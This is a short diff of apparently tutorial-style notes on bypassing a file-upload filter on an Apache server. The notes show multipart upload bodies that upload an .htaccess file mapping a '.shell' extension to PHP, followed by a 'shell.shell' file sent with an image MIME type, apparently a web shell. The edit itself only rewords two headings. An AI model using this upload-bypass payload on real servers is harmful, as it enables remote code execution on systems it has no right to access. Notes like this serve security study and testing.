@@ -45,13 +45,13 @@
    
    this file is the file of configration in appache you can add configration on it to accept any extension ike .shell , .test then you should aupload two fils file .htaccess 
    
-   file One
+   First file
    
        Content-Disposition: form-data; name="avatar"; filename=".htaccess"
        Content-Type: text/plain
        AddType application/x-httpd-php .shell
    
-   flle Two
+   Second flle 
    
        Content-Disposition: form-data; name="avatar"; filename="shell.shell"
        Content-Type: image/png
